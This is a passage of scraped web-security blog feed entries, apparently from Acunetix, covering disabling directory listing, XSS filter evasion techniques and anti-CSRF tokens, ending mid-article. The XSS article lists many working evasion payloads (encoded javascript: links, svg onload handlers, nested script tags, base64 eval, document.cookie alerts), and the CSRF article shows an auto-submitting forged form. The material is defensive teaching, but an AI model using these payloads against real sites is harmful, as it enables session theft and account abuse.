at:\n/etc/lighttpd/conf.d/dirlisting.conf\n2. Look for the following configuration:\ndir-listing.activate\n=\n\"enable\"\n3. Change “enable” to “disable” to turn off directory listing:\ndir-listing.activate\n=\n\"disable\"\n4. Save the file and restart Lighttpd for the changes to take effect:\nsudo\nsystemctl\nrestart\nlighttpd\nOnce directory listing is disabled, users will no longer be able to view the contents of directories without an index file, reducing the risk of exposing sensitive files on the server.\nDisabling Directory Listing on IIS\nBy default, directory listing is disabled on Microsoft IIS (Internet Information Services). However, if it has been enabled due to configuration changes or a regression, you can manually turn it off using the IIS Manager Console.\nDisabling Directory Listing in IIS 7 and Later\n- Open IIS Manager\n- Press Win + R, type inetmgr, and press Enter to open IIS Manager.\n- Select the Website or Server\n- In the Connections panel on the left, expand the server node and select either:\n- The entire server (to apply the change globally).\n- A specific site (to disable directory listing for only that website).\n- In the Connections panel on the left, expand the server node and select either:\n- Open Directory Browsing Settings\n- In the Features View, find and click on Directory Browsing.\n- Disable Directory Listing\n- In the Actions panel on the right, click Disable to turn off directory browsing.\n- Apply Changes and Restart IIS\n- Click Apply (if needed) and restart IIS to ensure the settings take effect: iisreset\nAlternative: Disabling Directory Listing via Web.config\nIf you prefer to modify the configuration file directly, you can disable directory listing for a specific site by adding the following setting to the Web.config file in the site’s root directory:\n<configuration>\n<system.webServer>\n<directoryBrowse\nenabled=\"false\"/>\n</system.webServer>\n</configuration>\nResult\nWith directory listing disabled, IIS will no longer display a file index when users access a directory without an index file (e.g., index.html). Instead, they will receive a 403 Forbidden error, improving security by preventing unauthorized access to server file structures.\nDisabling Directory Listing on Apache\nOn an Apache web server, directory listing allows users to view the contents of a directory if no default index file (e.g., index.html or index.php) is present. To enhance security and prevent unauthorized access to files, directory listing should be disabled.\nMethod 1: Using .htaccess (Per-Directory Configuration)\nIf you want to disable directory listing for a specific application or directory, create or edit a .htaccess file in the target directory and add the following line:\nOptions -Indexes\nThis ensures that users cannot view the directory contents when an index file is missing. Instead, they will receive a 403 Forbidden error.\nMethod 2: Editing the Apache Configuration (httpd.conf)\nTo disable directory listing globally for all websites hosted on Apache, modify the main Apache configuration file (httpd.conf):\n1. Open the Apache configuration file, typically located at:\n/etc/apache2/apache2.conf\n(Ubuntu/Debian)\n/etc/httpd/conf/httpd.conf\n(CentOS/RHEL)\n2. Locate the <Directory> section for the root directory (/var/www/html or equivalent) and ensure that Indexes is removed from the Options directive. Modify it as follows:\n<Directory\n/var/www/html>\nOptions\n-Indexes\nAllowOverride\nAll\nRequire\nall\ngranted\n</Directory>\n3. Save the file and restart Apache to apply the changes:\nsudo\nsystemctl\nrestart\napache2\n#\nUbuntu/Debian\nsudo\nsystemctl\nrestart\nhttpd\n#\nCentOS/RHEL\nResult\nOnce directory listing is disabled, users will no longer be able to browse directories without an index file. Instead, they will receive a 403 Forbidden error, ensuring sensitive files and application structures remain hidden from unauthorized access.\nFinal Thoughts on Disabling Directory Listing\nDisabling directory listing is a fundamental yet often overlooked step in securing a web server. Allowing unauthorized users to browse directories can expose sensitive files, configuration details, or outdated scripts, increasing the risk of data breaches and cyberattacks. Whether you’re using Apache, Nginx, IIS, Tomcat, LiteSpeed, or Lighttpd, ensuring that directory listing is turned off helps protect server infrastructure, sensitive data, and overall web application security.\nBy implementing the correct settings at the server or application level, you can eliminate unnecessary exposure, reduce attack surfaces, and prevent attackers from gathering intelligence about your server environment. Security is an ongoing process, so regular security audits, proper access controls, and automated vulnerability scanning should complement these measures to ensure comprehensive protection.\nGet the latest content on web security\nin your inbox each week.", "timestamp": "2025-10-21T13:34:36.103557"}
{"source": "blog", "feed": "https://www.acunetix.com/blog/feed/", "title": "XSS Filter Evasion: How Attackers Bypass XSS Filters – And Why Filtering Alone Isn’t Enough", "url": "https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/", "published": "Wed, 12 Feb 2025 13:12:01 +0000", "content": "XSS filter evasion techniques allow attackers to bypass cross-site scripting (XSS) protections designed to block malicious scripts. This article explores some of the most common filter bypass strategies, explains why relying solely on filtering is ineffective, and outlines the best practices for preventing XSS attacks.\nAttackers have developed hundreds of methods to evade XSS filters, making it clear that filtering alone is not a foolproof defense. For an XSS attack to succeed, two conditions must be met:\n- The application must have an XSS vulnerability that allows user-controlled input to be injected into web pages.\n- The attacker must find a way to execute malicious JavaScript within the victim’s browser.\nXSS filtering aims to stop these attacks by detecting and removing suspicious code before it reaches the browser. However, because attackers continuously develop new techniques to disguise or encode their payloads, filtering alone cannot fully prevent XSS vulnerabilities. Before exploring just a handful of the many ways filters can be bypassed, let’s first take a look at how XSS filtering works and why it remains an incomplete solution.\nLEARN MORE: Cross Site Scripting Vulnerability Fix\nWhy XSS Filtering Is Challenging and Often Ineffective\nXSS filtering is a security mechanism designed to detect and block cross-site scripting (XSS) attempts by inspecting user input for potentially harmful scripts. Filtering can be implemented at different levels:\n- Client-side filtering happens in the browser before data is processed.\n- Server-side filtering occurs during request processing on the web server.\n- Web Application Firewalls (WAFs) analyze and block suspicious requests before they reach the application.\nFor many years, server-side filtering was the primary defense against XSS. Eventually, browser vendors introduced XSS auditors, which attempted to detect malicious scripts before rendering them. These auditors scanned incoming data for known XSS patterns, such as <script> tags in unexpected locations, using techniques like regular expressions and blacklists. When suspicious code was found, the browser could either block the entire page or remove only the detected script fragment—both of which had drawbacks and sometimes introduced new security risks. As a result, built-in browser XSS filters were eventually discontinued.\nThe Limitations of XSS Filtering\nNo single filtering approach can comprehensively prevent XSS attacks due to the diverse ways in which malicious scripts can be injected and executed:\n- Browser-based filtering is only effective against reflected XSS vulnerabilities, where injected scripts are immediately reflected back in a browser response. However, it does not protect against stored XSS (where malicious scripts are saved in the database and executed later) or DOM-based XSS (where the exploit happens entirely within the browser without server involvement).\n- Server-side and WAF filtering can help mitigate reflected and stored XSS, but they cannot stop DOM-based XSS, since those attacks occur directly in the browser without ever reaching the server.\n- Application-level filtering is highly complex, requires ongoing updates to keep up with new attack techniques, and can sometimes introduce unintended security issues.\nHow Attackers Bypass Cross-Site Scripting (XSS) Filters\nXSS filters are designed to block malicious scripts, but attackers have developed numerous evasion techniques to bypass them. While XSS attacks typically exploit application vulnerabilities and misconfigurations, filter evasion techniquestarget weaknesses in the filtering mechanisms of browsers, servers, or web application firewalls (WAFs).\nAt best, XSS filtering adds an extra layer of difficulty for attackers by forcing them to find ways to slip their payloads past security measures. However, filtering alone is not a foolproof defense, as attackers continuously find new ways to exploit gaps in web security mechanisms.\nHow XSS Filters Are Bypassed\nAttackers take advantage of inconsistencies in how browsers interpret web code. Modern browsers spend a significant amount of processing power correcting and rendering malformed HTML, CSS, and JavaScript to ensure web pages display properly—even when there are coding errors. XSS filter evasion techniques abuse this complexity by exploiting variations in how different browsers handle non-standard code, exceptions, and edge cases.\nCommon Techniques Used to Evade XSS Filters\nThere are countless ways to bypass XSS filters, often involving obscured or unconventional script injection methods. While <script> tag injections are usually blocked, attackers frequently use alternative HTML elements and event handlers to execute malicious scripts.\nCommon evasion techniques include:\n- Using HTML event handlers: Instead of injecting <script> tags, attackers use attributes like onerror, onclick, or onfocus to execute JavaScript when a user interacts with the page.\n- Encoding techniques: Obfuscating payloads using different encoding methods (e.g., URL encoding, Base64 encoding) to slip past basic filters.\n- JavaScript quirks and syntax variations: Taking advantage of browser-specific parsing rules that allow JavaScript execution in unexpected ways.\n- Abusing malformed HTML: Injecting scripts into elements that browsers automatically attempt to “fix,” inadvertently executing the malicious code.\nThe Scale of XSS Filter Bypass Techniques\nThe number of ways to bypass XSS filters is staggering. Even the longest-known lists of filter bypass methods—such as the OWASP XSS Filter Evasion Cheat Sheet (which builds on RSnake’s original work)—only scratch the surface. While many bypass methods work only in specific scenarios, anyone working with JavaScript and web security should be aware that these exploits exist and that relying solely on filtering is not a reliable defense.\nCharacter Encoding Tricks for XSS Evasion\nAttackers often use character encoding techniques to bypass XSS filters that rely on detecting specific keywords or patterns. By encoding characters in different formats, they can obscure malicious payloads from basic filtering mechanisms. Additionally, nested encodings—where a string is encoded multiple times using different methods—can further evade detection.\nThe effectiveness of encoding tricks depends on how the browser processes and decodes characters in different contexts. For instance, URL encoding works within <a href> attributes but may not function the same way in other elements. Similarly, different encodings can be interpreted differently across browsers, making detection and prevention more difficult.\nExample: Encoding to Evade JavaScript Detection\nA basic XSS filter might block the javascript: keyword to prevent execution of inline scripts. However, an attacker can encode some or all of the characters using HTML entity encoding to obscure the payload:\n<a href=”javascript:alert(‘Successful XSS’)”>Click this link!</a>\nIn this example, j represents the ASCII character for “j”, meaning the browser will correctly interpret and execute the javascript: command once the page loads.\nWhy Encoding Tricks Are Dangerous\nCharacter encoding tricks are especially effective because:\n- Filters may not decode input before scanning, allowing encoded payloads to slip through.\n- Browsers automatically decode and execute encoded values, making them a reliable attack vector.\n- Multiple encodings can be stacked, further complicating detection.\nThese techniques demonstrate why string-matching filters alone cannot effectively prevent XSS. A comprehensive security approach, including Content Security Policies (CSPs), input sanitization, and secure coding practices, is necessary to mitigate these threats.\nAttackers use various encoding methods to obscure malicious payloads and bypass XSS filters that scan for specific patterns. Encoding techniques exploit how browsers interpret character representations, allowing scripts to execute despite being altered from their original form. Below are some of the most commonly used encoding techniques for evading XSS filters.\nHexadecimal Encoding for ASCII Characters\nSome filters detect HTML entity codes by looking for patterns like &# followed by a number. To bypass this, attackers can use hexadecimal encoding for ASCII characters instead of decimal values:\n<a href=”javascript:alert(document.cookie)”>Click this link!</a>\nHere, j represents the ASCII character “j”, allowing the browser to reconstruct the javascript: scheme.\nBase64 Encoding for Obfuscation\nAttackers can also use Base64 encoding to disguise payloads. When executed, JavaScript functions such as atob()decode the Base64 string, reconstructing the original malicious script:\n<body onload=\"eval(atob('YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk='))\">\nThis decodes to:\nalert('Successful XSS');\nZero-Padded Entity Variations\nHTML entity encoding allows 1 to 7 numeric characters, and leading zeros are ignored. This means each character can have multiple valid representations, making it harder for filters to catch all variations. For example, the < character alone has at least 70 valid encodings, as listed in the OWASP XSS Filter Evasion Cheat Sheet. Additionally, semicolons are not required at the end of entity codes, further complicating detection:\n<a href=\"javascript:alert('Successful XSS')\">Click this link!</a>\nHere, j represents \"j\", : represents \"X\", and a represents \"a\", ultimately forming a valid javascript:alert() payload.\nCharacter Codes for Concealed Script Execution\nInstead of writing a script directly, attackers can use JavaScript’s String.fromCharCode() function to generate it dynamically, making detection harder:\n<iframe src=# onmouseover=alert(String.fromCharCode(88,83,83))></iframe>\nIn this example, String.fromCharCode(88,83,83) translates to “XSS”, triggering an alert when the mouse hovers over the iframe.\nWhy These Encoding Tricks Work\n- Many filters only scan for specific patterns, such as javascript: or <script>, and fail to decode obfuscated payloads.\n- Browsers automatically interpret encoded characters, reconstructing the malicious script before execution.\n- Multiple encoding methods can be combined, making detection even more difficult.\nThese examples highlight the limitations of XSS filtering and reinforce why stronger security measures, such as Content Security Policy (CSP), proper input validation, and output encoding, are essential for preventing XSS attacks.\nUsing Whitespace to Evade XSS Filters\nBrowsers are highly tolerant of whitespace variations in HTML and JavaScript, allowing attackers to use non-printing characters to bypass basic XSS filters. While most modern browsers have hardened against these techniques, whitespace embedding can still work in certain contexts where filtering mechanisms fail to anticipate these variations.\nBreaking Up Keywords with Tabs\nBrowsers ignore tab characters when parsing JavaScript, meaning an attacker can insert tabs within keywords to evade simple string-matching filters. For example, an <img> tag with an XSS payload can be obfuscated as follows (though this method is ineffective in most modern browsers):\n<img src=\"java\nscript:al\nert('Successful XSS')\">\nAlternatively, tabs can be encoded using hexadecimal representations to further obscure the payload:\n<img src=\"java\tscript:al\tert('Successful XSS')\">\nUsing Newlines and Carriage Returns\nSimilar to tabs, newline (\\n, \n) and carriage return (\\r, \r) characters are ignored when parsing JavaScript and HTML. Attackers can use these characters to split keywords, making detection more difficult:\n<a href=\"jav\nascript:\nale\rrt('Successful XSS')\">Visit google.com</a>\nIn this case, the browser correctly interprets the encoded characters, reconstructing the javascript: payload before execution.\nUsing Whitespace and Special Characters to Evade Filters\nSome XSS filters specifically look for “javascript:” or ‘javascript:’, assuming that there will be no unexpected whitespace or special characters. However, browsers allow any combination of spaces and non-printable characters (ASCII values 1-32 in decimal) before recognized keywords, making it possible to bypass such filters:\n<a href=\"   javascript:alert('Successful XSS')\">Click this link!</a>\nIn this example:\n-  (ASCII backspace) and  (ASCII device control character) are inserted before javascript: to disrupt simple keyword detection.\n- The browser still recognizes and executes the payload correctly.\nWhy These Techniques Work\n- Many filtering systems check for exact matches of known attack patterns but fail to account for whitespace and encoding variations.\n- Browsers automatically normalize and execute code, even when non-printable characters are inserted.\n- Attackers can combine multiple evasion techniques, making it difficult to create a universal filter that blocks all variations.\nThese examples highlight the limitations of filter-based defenses and reinforce why secure input validation, output encoding, and Content Security Policies (CSPs) are necessary to properly mitigate XSS vulnerabilities.\nManipulating Tags to Evade XSS Filters\nAttackers can exploit how browsers process and repair malformed HTML to bypass XSS filters that simply scan for and remove certain tags. By nesting, omitting spaces, or breaking syntax in unconventional ways, they can craft payloads that slip through basic filtering mechanisms while remaining executable in the browser.\nNesting Tags to Evade Simple Tag Removal\nIf an XSS filter detects and removes <script> tags in a single pass, attackers can nest them within other tags to ensure that valid executable code remains after filtering:\n<scr<script>ipt>document.write(\"Successful XSS\")</scr<script>ipt>\nIn this example, if a filter removes <script>, the remaining code reconstructs a valid <script> tag, allowing the JavaScript to execute.\nOmitting Whitespace and Using Slashes as Separators\nBrowsers do not always require spaces between attributes, and some filters fail to account for alternative character placements. A forward slash (/) can act as a separator between the tag name and attributes, avoiding detection:\n<img/src=”funny.jpg”onload=javascript:eval(alert(‘Successful XSS’))>\nThis entirely whitespace-free payload still executes correctly in a browser, as it recognizes the onload attribute despite the unconventional formatting.\nUsing SVG Tags for XSS Execution\nBecause modern browsers support SVG (Scalable Vector Graphics), attackers can use SVG elements as an alternative to <script> tags. This allows script execution even in environments that block traditional script tags:\n<svg/onload=alert('XSS')>\nEven if certain characters are restricted, like parentheses or single quotes, attackers can replace them with backticks (`), which are still valid in JavaScript:\n<svg/onload=alert`XSS`>\nExploiting Browser Auto-Correction of Malformed Tags\nWeb browsers are designed to fix broken HTML to ensure web pages display properly. Attackers can take advantage of this behavior to craft malformed elements that become valid after processing.\nFor example, omitting the href attribute and quotes in an <a> tag still allows an event handler to execute JavaScript:\n<a onmouseover=alert(document.cookie)>Go to google.com</a>\nExtreme Example: Breaking and Reconstructing an <img> Tag\nBy deliberately corrupting an <img> tag’s syntax, attackers can rely on the browser’s automatic correction mechanismsto repair the tag and execute a malicious script:\n<img \"\"\"><script src=xssattempt.js></script>\">\nOnce interpreted by the browser, the misplaced attributes are ignored, and the <script> tag executes as intended.\nWhy These Techniques Work\n- Filters that remove or block tags in a single pass may fail to prevent nested or reconstructed elements.\n- Browsers attempt to correct malformed HTML, allowing attackers to craft broken but ultimately functionalpayloads.\n- Alternative tag structures, such as SVG or event handler attributes, provide script execution pathways even in environments that block <script> tags.\n- Filters that expect standard formatting can be bypassed by removing spaces, using alternative separators, or encoding characters differently.\nThese examples highlight the importance of context-aware input validation, secure output encoding, and the use of Content Security Policies (CSPs) to prevent XSS vulnerabilities, rather than relying on simple tag-based filtering alone.\nExploiting Internet Explorer’s Unique XSS Vulnerabilities\nBefore the dominance of Chrome and Firefox—and long before Microsoft Edge—Internet Explorer (IE) was the primary web browser. Due to its non-standard implementations and deep integration with other Microsoft technologies, IE introduced unique security quirks that attackers could exploit. While modern browsers have largely moved past these vulnerabilities, some legacy enterprise applications still rely on IE-specific features, making them relevant for certain attack scenarios.\nVBScript Execution in Older Internet Explorer Versions\nMost XSS filters are designed to block JavaScript-based payloads, but versions of Internet Explorer up to IE10 also supported VBScript, creating an alternative attack vector:\n<a href='vbscript:MsgBox(\"Successful XSS\")'>Click here</a>\nBecause VBScript execution was allowed in hyperlinks, attackers could trigger malicious actions through simple anchor tags.\nCSS-Based Script Execution with Dynamic Properties\nInternet Explorer introduced dynamic properties, which allowed CSS attributes to execute JavaScript expressions. This behavior provided an unusual XSS entry point via CSS:\nbody { color: expression(alert('Successful XSS')); }\nInstead of acting as a pure styling rule, expression() could evaluate and execute arbitrary JavaScript when the affected CSS property was accessed.\nUsing the dynsrc Attribute for Script Execution\nIE also supported the now-removed dynsrc attribute for images, which could be abused to execute JavaScript:\n<img dynsrc=\"javascript:alert('Successful XSS')\">\nUnlike standard <img> tags, which require properly formatted image sources, IE would process dynsrc as a valid JavaScript URL, triggering execution.\nBypassing Quote Restrictions with Backticks\nIf an application restricted both single (‘) and double (“) quotes, attackers could use backticks (`) instead, which Internet Explorer interpreted correctly in certain cases:\n<img src=`javascript:alert(\"The name is 'XSS'\")`>\nDisguising a Script as an External Stylesheet\nOlder versions of Internet Explorer allowed scripts to be executed by embedding them in external CSS files. Attackers could exploit this by injecting malicious code into a .css file and referencing it in a <link> tag:\n<link rel=\"stylesheet\" href=\"http://example.com/xss.css\">\nIf the external file contained JavaScript instead of CSS, some versions of IE would still execute the script, providing another method for delivering XSS payloads.\nWhy These Techniques Matter\nWhile most of these IE-specific vulnerabilities have been eliminated in modern browsers, some legacy enterprise systems still rely on older versions of IE. Attackers targeting these environments can use these non-standard execution methods to bypass traditional XSS filters.\nTo properly mitigate these risks, security measures should include:\n- Strict Content Security Policies (CSPs) to prevent execution of unauthorized scripts.\n- Input validation and output encoding to block injection attempts at the application level.\n- Eliminating reliance on outdated browsers and enforcing secure, modern alternatives.\nDespite being historical quirks, these Internet Explorer exploits highlight how browser-specific behaviors can create unexpected security vulnerabilities.\nA Look Back: Legacy XSS Exploits\nAs web technologies evolve, XSS filter bypass techniques quickly become outdated. However, looking at past exploits provides insight into the unintended edge cases that emerge when new specifications are introduced while maintaining backward compatibility. Below are some historical XSS techniques that may no longer work in modern browsers but highlight the creative methods attackers have used in the past.\nInjecting JavaScript into Background Attributes\nIn older browsers, HTML attributes meant for styling could be used to execute JavaScript. For example, the background attribute on a <body> tag could trigger an XSS payload:\n<body background=\"javascript:alert('Successful XSS')\">\nA similar approach worked when using inline CSS properties, injecting JavaScript into a background-image property:\n<div style=\"background-image:url(javascript:alert('Successful XSS'))\">\nImages as Script Execution Vectors\nSome browsers allowed non-image content to be executed when loaded into an <img> or <input> field. Attackers could exploit this by using a JavaScript URL in an image source:\n<input type=\"image\" src=\"javascript:alert('Successful XSS')\">\nUsing <meta> Refresh for Script Injection\nIn some outdated browsers, the <meta> tag’s refresh attribute could be abused to redirect the page to a Base64-encoded JavaScript payload, leading to execution:\n<meta http-equiv=\"refresh\" content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\nHere, the Base64-encoded string decodes into:\n<script>alert('XSS')</script>\nThis technique worked because some browsers automatically decoded and executed Base64-encoded content as part of a page load.\nUTF-7 Encoding: A Forgotten XSS Attack\nAt one point, it was possible to hide XSS payloads using UTF-7 encoding, a character encoding format that some browsers supported:\n<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"></head>\n+adw-script+ad4-alert('xss');+adw-/script+ad4-\nIn this example:\n- The <meta> tag declares that the page uses UTF-7 encoding instead of the more common UTF-8.\n- The XSS payload is encoded using UTF-7 notation, where +adw- represents < and +ad4- represents >.\n- Some browsers automatically interpreted and executed this encoded JavaScript, allowing for successful exploitation.\nWhy These Methods Matter\nWhile these specific techniques no longer work in modern browsers, they illustrate how small quirks in web technology can lead to major security issues. Attackers continually look for unexpected behaviors in browsers and web standards, which is why XSS prevention must go beyond filtering and include:\n- Proper input validation and output encoding to neutralize potential attack vectors.\n- Content Security Policies (CSPs) to restrict script execution sources.\n- Regular security updates to prevent exploitation of older browser features.\nEven though these methods are historical artifacts, they serve as a reminder that security must evolve alongside web technologies to prevent future XSS vulnerabilities.\nHow to Protect Your Applications from XSS – Beyond Filtering\nWhile web application firewalls (WAFs) can provide some level of XSS filtering, they should only be considered one layer of a broader security strategy. With hundreds of known filter bypass techniques and new attack methods constantly emerging, filtering alone is not a reliable defense. Additionally, aggressive filtering can interfere with legitimate scripts, which is one of the reasons browser vendors are moving away from built-in XSS filtering.\nBuilding Secure Applications to Prevent XSS\nThe most effective way to protect against cross-site scripting (XSS) is to write secure, well-structured code that prevents vulnerabilities at the source. Instead of relying on filters, developers should:\n- Treat all user input as untrusted by default, ensuring strict validation and sanitization.\n- Apply context-aware escaping and encoding, making sure that user-controlled data cannot be interpreted as executable code.\n- Enforce security at the HTTP level by implementing Content Security Policy (CSP) headers and other essential HTTP security headers to restrict script execution.\nContinuous Testing for XSS Prevention\nEven with secure coding practices in place, applications must be regularly tested to ensure that new features, updates, or configuration changes do not introduce XSS vulnerabilities. A robust web vulnerability scanning process should be integrated into development workflows, allowing for continuous security monitoring and automated detection of misconfigurations and vulnerabilities.\nBy prioritizing secure development practices, proper security headers, and ongoing vulnerability assessments, developers can effectively mitigate XSS threats without relying on filtering alone.\nGet the latest content on web security\nin your inbox each week.", "timestamp": "2025-10-21T13:34:36.878168"}
{"source": "blog", "feed": "https://www.acunetix.com/blog/feed/", "title": "Preventing CSRF Attacks with Anti-CSRF Tokens: Best Practices and Implementation", "url": "https://www.acunetix.com/blog/articles/preventing-csrf-attacks-anti-csrf-tokens/", "published": "Wed, 12 Feb 2025 12:55:11 +0000", "content": "The most widely used method to prevent cross-site request forgery (CSRF) attacks is the implementation of anti-CSRF tokens. These are unique values generated by a web application and validated with each request to ensure authenticity. CSRF attacks exploit a user’s active session to execute unauthorized actions, such as redirecting them to a malicious website or accessing sensitive session data.\nTo effectively mitigate these risks, it is essential to generate, manage, and validate CSRF tokens correctly, ensuring robust protection against unauthorized requests.\nWhat Is an Anti-CSRF Token?\nAn anti-CSRF token (also known as a CSRF token) is a security mechanism designed to verify the legitimacy of a user’s request. It works by assigning a unique, unpredictable token to the user’s browser, which must be included in subsequent requests. This ensures that the request originates from the authenticated user and not from an attacker. To be effective, the token must be cryptographically secure and resistant to guessing. The application must validate the token before processing any HTTP request, allowing only authorized actions within a user’s session.\nWhat Is Cross-Site Request Forgery (CSRF)?\nCross-site request forgery (CSRF) is a web security vulnerability that enables an attacker to execute unauthorized actions on behalf of a legitimate user. In a typical CSRF attack, the attacker tricks the user into clicking a malicious link or visiting a compromised webpage, which then sends forged requests to a web application where the user is authenticated. Depending on the targeted application, a successful CSRF attack can manipulate user data, change account settings, or perform other unintended state-changing actions.\nWhile there are multiple ways to implement anti-CSRF protection, the fundamental principle remains the same: ensuring that every request comes from a trusted source. To better understand how this works, let’s explore a basic example.\nExample of a CSRF Vulnerability\nImagine you operate a web application hosted on www.example.com without any CSRF protection. Within this application, users can post messages to their profile by filling out a simple HTML form and clicking Submit:\n<form action=\"/action.php\" method=\"post\">\nSubject: <input type=\"text\" name=\"subject\"/><br/>\nContent: <input type=\"text\" name=\"content\"/><br/>\n<input type=\"submit\" value=\"Submit\"/>\n</form>\nWhen the user submits the form, their web browser sends a POST request to the server, transmitting the inputted data through the subject and content parameters:\nPOST /post.php HTTP/1.1\nHost: example.com\nsubject=I am feeling pretty good today&content=I just ate a cookie, chocolate chip\nWithout CSRF protection, an attacker could exploit this by crafting a malicious webpage that silently submits a request on behalf of an authenticated user, potentially posting unwanted content or performing other unintended actions within the user’s session.\nHow a CSRF Attack Can Exploit a Vulnerable Web Application\nIf a user is logged into a web application and an attacker understands how requests are structured, they can exploit cross-site request forgery (CSRF) by tricking the user into unknowingly submitting a malicious request. This can be done by luring the user to visit a website controlled by the attacker, which then automatically executes an unauthorized action—such as posting an advertisement on the user’s profile.\nFor example, the attacker’s site could contain a hidden form like this:\n<form action=\"https://example.com/action.php\" method=\"post\">\n<input type=\"text\" name=\"subject\" value=\"Buy my product!\"/>\n<input type=\"text\" name=\"content\" value=\"To buy my product, visit this site: example.biz!\"/>\n<input type=\"submit\" value=\"Submit\"/>\n</form>\n<script>\ndocument.forms[0].submit();\n</script>\nWhen the user visits the attacker’s site, the embedded JavaScript automatically submits the form, making their browser send the following POST request to the legitimate application:\nPOST /post.php HTTP/1.1\nHost: example.com\nsubject=Buy my product!&content=To buy my product, visit this site: example.biz!\nIf the targeted site lacks CSRF protection, the request will be processed as if the user intentionally submitted it. Since the browser includes the user’s session cookie in the request, the server treats it as a legitimate action—without verifying its origin. This is what makes CSRF so dangerous: the server assumes the request is valid simply because it comes from an authenticated session, regardless of where it was triggered.\nImplementing a Basic CSRF Token for Protection\nTo defend against CSRF attacks, a simple token-based mitigation strategy can be implemented. This involves generating a unique security token when a user logs in and ensuring that all form submissions within the application include this token. When properly generated and validated, this approach prevents unauthorized requests from being processed.\nA secure form implementation might look like this:\n<form action=\"/post.php\" method=\"post\">\nSubject: <input type=\"text\" name=\"subject\"/><br/>\nContent: <input type=\"text\" name=\"content\"/><br/>\n<input type=\"hidden\" name=\"csrf_token\" value=\"dGhpc3Nob3VsZGJlcmFuZG9t\"/>\n<input type=\"submit\" value=\"Submit\"/>\n</form>\nOn the server side, only POST requests containing the correct CSRF token should be accepted. A properly formatted request might look like this:\nPOST /post.php HTTP/1.1\nHost: example.com\nsubject=I am feeling pretty good today&content=I just ate a cookie, chocolate chip&csrf_token=dGhpc3Nob3VsZGJlcmFuZG9t\nBy enforcing token validation, the server ensures that only legitimate users can submit requests. Attackers attempting to exploit CSRF by sending forged requests from an external site will fail because they cannot predict or access the valid user’s token. Since the server rejects any request lacking the correct token, unauthorized actions are effectively blocked.\nBest Practices for Secure CSRF Token Generation and Validation\nThe method you use to generate and verify CSRF tokens should align with your application’s security requirements. Many modern web frameworks and programming languages provide built-in CSRF protection, and leveraging these features or a well-maintained external library is often the most reliable approach. If you need to implement CSRF protection manually, follow these key guidelines to ensure your tokens are effective:\n- Use Cryptographically Secure Tokens – Tokens should be randomly generated using a cryptographic algorithm and be at least 128 bits in length to withstand brute-force attacks.\n- Prevent Token Reuse – Each token should be tied to a specific user session and regenerated after sensitive actions. Expiring tokens after an appropriate time frame balances security and usability.\n- Enforce Strict Token Validation – The server must validate tokens on every request using a secure comparison method (e.g., cryptographic hash comparison) to prevent manipulation.\n- Avoid Exposure in URLs or Unencrypted Traffic – Never send CSRF tokens via GET requests or in unencrypted HTTP traffic. This prevents tokens from being leaked through server logs, browser history, or referrer headers.\n- Leverage Secure Cookies – Storing CSRF tokens in SameSite cookies helps mitigate cross-site attacks. Additionally, using the HTTPOnly attribute prevents JavaScript-based exploits from accessing tokens.\n- Mitigate XSS Vulnerabilities – Cross-site scripting (XSS) can allow attackers to steal or manipulate CSRF tokens. Ensuring your application is free from XSS flaws strengthens overall CSRF protection.\nBy adhering to these best practices, you can effectively prevent CSRF attacks and ensure that only legitimate user requests are processed by your application.\nImplementing Different Levels of CSRF Protection\nA basic CSRF protection mechanism involves generating a token when a user logs in, storing it in their session cookie, and requiring that token for all form submissions during the active session. This method can be effective, particularly when combined with session expiration policies. However, certain applications may require a more robust approach to enhance security.\nForm-Specific CSRF Protection\nFor improved security while maintaining usability, you can generate a unique CSRF token for each form instead of relying on a single session-wide token. This approach ensures that even if one token is compromised, it cannot be used for unauthorized actions across multiple forms.\nTo implement this method:\n- Generate a CSRF token internally but do not expose it directly to the user’s browser.\n- Create a hashed version of the token combined with the form filename before sending it to the client. For example:\nhash_hmac(‘sha256’, ‘post.php’, $_SESSION[‘internal_token’]);\n- Verify the token on the server by regenerating the hash and comparing it with the submitted value. If the computed hash matches the one received, the request is considered valid, ensuring that the same form was used for submission.\nBy implementing form-specific CSRF protection, you further reduce the risk of token reuse attacks, enhancing overall security without compromising user experience.\nPer-Request CSRF Protection\nFor applications requiring the highest level of security, such as online banking platforms, a per-request CSRF token strategy can be implemented. This approach involves invalidating each token immediately after it is verified, ensuring that every request requires a newly generated token. While highly secure, this method comes with notable usability challenges:\n- Increased Server Load – Each request demands the generation of a new cryptographically secure token, which can impact server performance and resource availability.\n- Limited Multi-Tab Functionality – Since each request requires a unique token, users cannot interact with the application across multiple browser tabs without triggering CSRF validation errors.\n- Restricted Navigation – Users cannot rely on the browser’s back button for navigation, as revisiting a previous page would attempt to submit an expired token. Instead, they must use the application’s built-in navigation controls.\nStateless CSRF Protection with Double-Submit Cookies\nIn scenarios where server-side token storage is impractical, such as high-traffic applications with limited backend storage capacity, stateless CSRF protection can be implemented using the double-submit cookie pattern. This method eliminates the need for the server to store tokens while still providing an effective defense against CSRF attacks.\nHow Double-Submit Cookies Work\n- Initial Token Generation – Before authentication, the server generates a random token and stores it in a cookie.\n- Token Transmission – Each subsequent request must include this token in a hidden form field or custom HTTP header.\n- Validation – The server verifies that the token received from the request matches the value stored in the user’s cookie.\nThere are two variations of this approach:\n- Basic Double-Submit Token (“Naive” Approach) – The token is a random, unguessable value. The server simply checks for a match between the cookie-stored token and the token submitted with the request.\n- Signed Double-Submit Token – The token is cryptographically signed using a server-side secret key, making it tamper-proof. Some implementations enhance security further by including timestamps in the token, allowing expiration-based validation.\nWhile double-submit cookies reduce backend storage requirements, they do not prevent CSRF attacks if an attacker can execute JavaScript in the user’s browser (e.g., through XSS vulnerabilities). Therefore, this method should be used alongside other security measures, such as SameSite cookies and XSS mitigation strategies.\nCSRF Protection for Asynchronous (Ajax) Requests\nModern web applications frequently use Ajax requests instead of traditional form submissions, which can complicate the implementation of standard CSRF tokens. A practical alternative is to include a custom request header in all Ajax requests that require CSRF protection. This header should contain a unique key-value pair that does not conflict with existing HTTP headers. On the server side, any incoming request without the expected custom header should be rejected to prevent unauthorized actions.\nHowever, it is important to note that misconfigured CORS (Cross-Origin Resource Sharing) policies could allow attackers to set both cookies and custom headers, potentially bypassing CSRF protections. To mitigate this risk, ensure that CORS settings strictly limit access to trusted origins under your control.\nExample: Automatic CSRF Protection in Ajax Requests\nTo enforce CSRF 